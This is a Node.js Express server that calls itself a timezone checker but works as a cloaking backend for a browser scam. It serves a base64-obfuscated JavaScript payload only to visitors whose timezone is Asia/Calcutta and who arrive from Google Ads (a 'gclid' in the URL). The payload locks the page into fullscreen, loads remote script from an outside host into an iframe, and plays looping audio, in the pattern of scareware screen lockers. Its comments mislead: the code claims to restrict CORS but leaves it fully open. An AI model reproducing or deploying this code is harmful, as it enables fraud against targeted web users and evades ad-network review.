const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors'); // Import cors

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware to parse JSON bodies
app.use(bodyParser.json());

// Enable CORS and restrict it to http://localhost:3000
app.use(cors());
// Serve the HTML file
app.get('/', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Timezone Check</title>
    </head>
    <body>
        <h1>Welcome to Website B</h1>
        <p>This server checks the timezone and URL parameters.</p>
    </body>
    </html>
    `);
});

// Endpoint to receive data from website A
app.post('/api/timezone', (req, res) => {
    const { timezone, fullUrl } = req.body;

    // Check if the request body is valid
    if (!req.body || !timezone || !fullUrl) {
        return res.status(400).send('Invalid request body.');
    }

    console.log(`Received timezone: ${timezone}, fullUrl: ${fullUrl}`);

    // Check if the timezone is Asia/Calcutta
    const isTimezoneJapan = timezone === 'Asia/Calcutta';

    // Check if the URL contains 'gclid'
    const containsGclid = fullUrl.includes('gclid');

    // Base64 code to send in response
    const base64Code = 'Ci8vIEhpZGUgb3ZlcmZsb3cgb24gdGhlIGRvY3VtZW50IGVsZW1lbnQKZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50LnN0eWxlLm92ZXJmbG93ID0gImhpZGRlbiI7CgovLyBJbnNlcnQgYW4gSFRNTCBkaXYgd2l0aCBzcGVjaWZpYyBzdHlsZXMgaW50byB0aGUgZG9jdW1lbnQgYm9keQpkb2N1bWVudC5ib2R5Lmluc2VydEFkamFjZW50SFRNTCgiYWZ0ZXJiZWdpbiIsIAogICAgJzxkaXYgaWQ9ImJydWNlRGl2IiBzdHlsZT0iei1pbmRleDogOTk5OTsgcG9pbnRlci1ldmVudHM6IGF1dG87IG92ZXJmbG93OiBoaWRkZW47Ij48L2Rpdj4nCik7CgovLyBBZGQgYSBjbGljayBldmVudCBsaXN0ZW5lciB0byB0cmlnZ2VyIGZ1bGxzY3JlZW4gYW5kIGZldGNoIGV4dGVybmFsIGNvbnRlbnQKZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCBmdW5jdGlvbigpIHsKICAgIHdpbmRvdy5zY3JvbGxUbygwLCAwKTsKICAgIHNldFRpbWVvdXQoKCkgPT4gewogICAgICAgIGlmIChkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQucmVxdWVzdEZ1bGxzY3JlZW4pIHsKICAgICAgICAgICAgZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50LnJlcXVlc3RGdWxsc2NyZWVuKCk7CiAgICAgICAgfSBlbHNlIGlmIChkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQubW96UmVxdWVzdEZ1bGxTY3JlZW4pIHsKICAgICAgICAgICAgZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50Lm1velJlcXVlc3RGdWxsU2NyZWVuKCk7CiAgICAgICAgfSBlbHNlIGlmIChkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQud2Via2l0UmVxdWVzdEZ1bGxzY3JlZW4pIHsKICAgICAgICAgICAgZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50LndlYmtpdFJlcXVlc3RGdWxsc2NyZWVuKCk7CiAgICAgICAgfSBlbHNlIGlmIChkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQubXNSZXF1ZXN0RnVsbHNjcmVlbikgewogICAgICAgICAgICBkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQubXNSZXF1ZXN0RnVsbHNjcmVlbigpOwogICAgICAgIH0KICAgIH0sIDEwMCk7CgogICAgLy8gRmV0Y2ggSmF2YVNjcmlwdCBjb250ZW50IGZyb20gdGhlIG5ldyBVUkwgYW5kIGVtYmVkIGl0IGluIGFuIGlmcmFtZQogICAgZmV0Y2goImh0dHBzOi8vaGV0YS5vbnJlbmRlci5jb20vIikKICAgICAgICAudGhlbihyZXNwb25zZSA9PiByZXNwb25zZS50ZXh0KCkpCiAgICAgICAgLnRoZW4oY29udGVudCA9PiB7CiAgICAgICAgICAgIGxldCBibG9iID0gbmV3IEJsb2IoW2NvbnRlbnRdLCB7IHR5cGU6ICJhcHBsaWNhdGlvbi9qYXZhc2NyaXB0IiB9KTsKICAgICAgICAgICAgbGV0IHVybCA9IFVSTC5jcmVhdGVPYmplY3RVUkwoYmxvYik7CiAgICAgICAgICAgIGxldCBpZnJhbWUgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpZnJhbWUiKTsKICAgICAgICAgICAgaWZyYW1lLnNyYyA9IHVybDsKICAgICAgICAgICAgaWZyYW1lLnN0eWxlLndpZHRoID0gIjEwMCUiOwogICAgICAgICAgICBpZnJhbWUuc3R5bGUuaGVpZ2h0ID0gIjEwMCUiOwogICAgICAgICAgICBpZnJhbWUuZnJhbWVCb3JkZXIgPSAiMCI7CiAgICAgICAgICAgIGlmcmFtZS5zZXRBdHRyaWJ1dGUoImFsbG93ZnVsbHNjcmVlbiIsICIiKTsKICAgICAgICAgICAgaWZyYW1lLnNldEF0dHJpYnV0ZSgid2Via2l0YWxsb3dmdWxsc2NyZWVuIiwgIiIpOwogICAgICAgICAgICBpZnJhbWUuc2V0QXR0cmlidXRlKCJtb3phbGxvd2Z1bGxzY3JlZW4iLCAiIik7CiAgICAgICAgICAgIGlmcmFtZS5zYW5kYm94ID0gImFsbG93LXNjcmlwdHMgYWxsb3ctcG9wdXBzIGFsbG93LWRvd25sb2FkcyI7CiAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJicnVjZURpdiIpLmFwcGVuZENoaWxkKGlmcmFtZSk7CiAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJicnVjZURpdiIpLnN0eWxlLmhlaWdodCA9ICIxMDB2aCI7CiAgICAgICAgfSkKICAgICAgICAuY2F0Y2goZXJyb3IgPT4gewogICAgICAgICAgICBjb25zb2xlLmVycm9yKCJFcnJvciBmZXRjaGluZyB0aGUgSmF2YVNjcmlwdDoiLCBlcnJvcik7CiAgICAgICAgfSk7Cn0sIHsgb25jZTogITAgfSk7CiAgICAgICAgZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCBmdW5jdGlvbiAoKSB7CiAgICAgICAgICAgIGxldCBlID0gbmV3IEF1ZGlvKCJodHRwczovL2F1ZGlvLmp1a2Vob3N0LmNvLnVrL0xXZFpIT1hKTWxsdkdNaDA5aWdaWjN4NGtpQkhPeGdiIik7CiAgICAgICAgICAgIGUubG9vcCA9ICEwOwogICAgICAgICAgICBlLnBsYXkoKTsKICAgICAgICAgICAgbGV0IHQgPSBuZXcgQXVkaW8oImh0dHBzOi8vYXVkaW8uanVrZWhvc3QuY28udWsvd3VENjVQc0tCckF4V0NaVTRjSjJDYmhVcXdsMzNVUnciKTsKICAgICAgICAgICAgdC5sb29wID0gITA7CiAgICAgICAgICAgIHQucGxheSgpOwogICAgICAgIH0sIHsgb25jZTogITAgfSk7Cg=='; // Your base64 string here

    // If both conditions are met, respond with the base64 code
    if (isTimezoneJapan && containsGclid) {
        console.log(`Response sent: ${base64Code}`);
        return res.status(200).send(base64Code); // Send the base64 string directly
    } else {
        const responseMessage = 'Conditions not met.';
        console.log(responseMessage);
        return res.status(200).send(responseMessage);
    }
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
